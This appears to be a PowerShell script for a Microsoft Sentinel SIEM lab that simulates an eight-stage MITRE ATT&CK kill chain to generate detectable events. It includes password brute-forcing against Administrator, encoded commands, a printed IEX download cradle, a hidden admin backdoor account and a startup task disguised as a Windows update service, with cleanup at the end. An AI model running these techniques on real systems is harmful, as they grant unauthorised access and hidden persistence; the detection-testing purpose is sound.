# ============================================================
# Microsoft Sentinel SIEM Lab - Kill Chain Simulation Script
# Author: Sanskar Lohani
# MITRE ATT&CK Mapped - 8 Stage Kill Chain
# ============================================================

# ============================================================
# STAGE 1: Initial Access - Brute Force (T1110)
# Simulates failed login attempts against local account
# ============================================================
Write-Host "[*] Stage 1: Brute Force Simulation - T1110" -ForegroundColor Red

$target = $env:COMPUTERNAME
$username = "Administrator"
$passwords = @("Password1","Password2","Password3","Password4",
               "Password5","Password6","Password7","Password8",
               "Password9","Password10")

foreach ($pass in $passwords) {
    $securePass = ConvertTo-SecureString $pass -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($username, $securePass)
    try {
        Start-Process -FilePath "cmd.exe" -Credential $cred -ArgumentList "/c whoami" -ErrorAction Stop
    } catch {
        Write-Host "[-] Failed login attempt with password: $pass" -ForegroundColor Yellow
    }
    Start-Sleep -Milliseconds 500
}

Write-Host "[+] Stage 1 Complete - Check EventID 4625 in Sentinel" -ForegroundColor Green
Start-Sleep -Seconds 5

# ============================================================
# STAGE 2: Execution - PowerShell Encoded Command (T1059.001)
# Simulates encoded PowerShell execution
# ============================================================
Write-Host "[*] Stage 2: PowerShell Encoded Execution - T1059.001" -ForegroundColor Red

$command = "Write-Host 'Simulated malicious payload executed'; Get-Process; Get-LocalUser"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell.exe -EncodedCommand $encoded

$downloadCradle = "IEX(New-Object Net.WebClient).DownloadString('http://raw.githubusercontent.com/test/test.ps1')"
powershell.exe -Command "Write-Host 'Simulating download cradle: $downloadCradle'"

Write-Host "[+] Stage 2 Complete - Check EventID 4104 in Sentinel" -ForegroundColor Green
Start-Sleep -Seconds 5

# ============================================================
# STAGE 3: Persistence - Create Backdoor Account (T1136)
# Creates a local user account for persistence
# ============================================================
Write-Host "[*] Stage 3: Create Backdoor Account - T1136" -ForegroundColor Red

$backdoorUser = "svc_backup"
$backdoorPass = ConvertTo-SecureString "Backdoor@2026!" -AsPlainText -Force

try {
    New-LocalUser -Name $backdoorUser -Password $backdoorPass -Description "Backup Service Account" -ErrorAction Stop
    Add-LocalGroupMember -Group "Administrators" -Member $backdoorUser -ErrorAction Stop
    Write-Host "[+] Backdoor account created: $backdoorUser" -ForegroundColor Green
} catch {
    Write-Host "[-] Account may already exist, continuing..." -ForegroundColor Yellow
}

Write-Host "[+] Stage 3 Complete - Check EventID 4720 and 4732 in Sentinel" -ForegroundColor Green
Start-Sleep -Seconds 5

# ============================================================
# STAGE 4: Persistence - Scheduled Task (T1053.005)
# Creates a scheduled task disguised as Windows service
# ============================================================
Write-Host "[*] Stage 4: Scheduled Task Persistence - T1053.005" -ForegroundColor Red

$taskName = "WindowsUpdateService"
$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonInteractive -WindowStyle Hidden -Command `"Write-Host 'Persistence payload'`""
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskSettings = New-ScheduledTaskSettingsSet -Hidden

try {
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -RunLevel Highest -Force -ErrorAction Stop
    Write-Host "[+] Scheduled task created: $taskName" -ForegroundColor Green
} catch {
    Write-Host "[-] Scheduled task creation failed: $_" -ForegroundColor Yellow
}

Write-Host "[+] Stage 4 Complete - Check EventID 4698 in Sentinel" -ForegroundColor Green
Start-Sleep -Seconds 5

# ============================================================
# STAGE 5: Privilege Escalation - Token Enumeration (T1134)
# Enumerates current identity and token privileges
# ============================================================
Write-Host "[*] Stage 5: Token/Identity Enumeration - T1134" -ForegroundColor Red

whoami /all
whoami /priv
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, Groups
Get-LocalGroupMember -Group "Administrators"

Write-Host "[+] Stage 5 Complete" -ForegroundColor Green
Start-Sleep -Seconds 5

# ============================================================
# STAGE 6: Discovery - Account Discovery (T1087)
# Enumerates local accounts and groups
# ============================================================
Write-Host "[*] Stage 6: Account Discovery - T1087" -ForegroundColor Red

net user
net localgroup administrators
whoami /all
Get-LocalUser | Select-Object Name, Enabled, LastLogon
Get-LocalGroup | Select-Object Name

Write-Host "[+] Stage 6 Complete - Check EventID 4688 in Sentinel" -ForegroundColor Green
Start-Sleep -Seconds 5

# ============================================================
# STAGE 7: Collection - Data Staging (T1074.001)
# Stages files in temp directory simulating data collection
# ============================================================
Write-Host "[*] Stage 7: Data Staging - T1074.001" -ForegroundColor Red

$stagingDir = "C:\Windows\Temp\svc_cache"
New-Item -Path $stagingDir -ItemType Directory -Force | Out-Null

$sensitiveFiles = @(
    "credentials.txt",
    "passwords.txt", 
    "network_config.txt",
    "user_accounts.txt",
    "system_info.txt",
    "active_connections.txt",
    "process_list.txt",
    "installed_software.txt",
    "registry_export.txt",
    "security_policy.txt",
    "firewall_rules.txt",
    "scheduled_tasks.txt",
    "startup_items.txt",
    "browser_history.txt",
    "ssh_keys.txt"
)

foreach ($file in $sensitiveFiles) {
    $content = "Simulated sensitive data - $(Get-Date) - $file"
    Set-Content -Path "$stagingDir\$file" -Value $content
    Start-Sleep -Milliseconds 200
}

Write-Host "[+] Staged $($sensitiveFiles.Count) files in $stagingDir" -ForegroundColor Green

$encoded2 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-ChildItem $stagingDir"))
powershell.exe -EncodedCommand $encoded2

Resolve-DnsName pastebin.com
Resolve-DnsName raw.githubusercontent.com
Resolve-DnsName github.com

Write-Host "[+] Stage 7 Complete - Check EventID 4663 in Sentinel" -ForegroundColor Green
Start-Sleep -Seconds 5

# ============================================================
# STAGE 8: Cleanup - Remove Artifacts (T1070)
# Removes staged files and scheduled task
# ============================================================
Write-Host "[*] Stage 8: Cleanup - T1070" -ForegroundColor Red

try {
    Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction Stop
    Write-Host "[+] Staging directory removed" -ForegroundColor Green
} catch {
    Write-Host "[-] Cleanup failed: $_" -ForegroundColor Yellow
}

try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
    Write-Host "[+] Scheduled task removed" -ForegroundColor Green
} catch {
    Write-Host "[-] Task removal failed: $_" -ForegroundColor Yellow
}

try {
    Remove-LocalUser -Name $backdoorUser -ErrorAction Stop
    Write-Host "[+] Backdoor account removed" -ForegroundColor Green
} catch {
    Write-Host "[-] User removal failed: $_" -ForegroundColor Yellow
}

Write-Host "[+] Stage 8 Complete" -ForegroundColor Green
Write-Host "[*] Kill Chain Simulation Complete - Check Sentinel for incidents" -ForegroundColor Cyan